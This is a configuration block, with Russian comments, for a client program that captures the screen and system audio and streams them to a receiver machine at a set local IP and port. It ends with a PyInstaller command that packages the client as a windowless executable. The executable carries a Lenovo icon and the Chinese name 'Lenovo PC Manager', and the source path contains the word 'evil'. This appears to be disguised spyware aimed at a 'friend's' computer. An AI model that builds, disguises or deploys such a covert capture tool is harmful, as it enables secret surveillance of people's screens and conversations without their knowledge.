# --- Адрес сервера Получателя ---
# Замени на РЕАЛЬНЫЙ ЛОКАЛЬНЫЙ IP-адрес компьютера друга
RECEIVER_IP = "192.168.0.12" # Пример! Узнать через ipconfig/ip addr
#RECEIVER_IP = "127.0.0.1" # Пример! Узнать через ipconfig/ip addr
RECEIVER_PORT = 8000

# --- Настройки видео ---
FRAME_RATE = 10  # Кадров в секунду
VIDEO_QUALITY = 30 # Качество JPEG (1-100)
MONITOR_NUM = 1 # Номер монитора для захвата

# --- Настройки аудио ---
# Укажи ТОЧНОЕ имя loopback устройства (VB-CABLE, Monitor of..., BlackHole)
AUDIO_DEVICE_NAME = 'микшер' # Пример для Windows
SAMPLE_RATE = 16000 # Должно совпадать с настройками сервера!
CHANNELS = 1
# Размер блока аудио для отправки (в секундах) - влияет на задержку
AUDIO_CHUNK_DURATION = 0.2 # Отправляем каждые 0.2 секунды

# pyinstaller --onefile --noconsole --icon=lenovo.ico --name=联想电脑管家 --version-file=version_info.txt F:\Programming\evil\client\source_client.py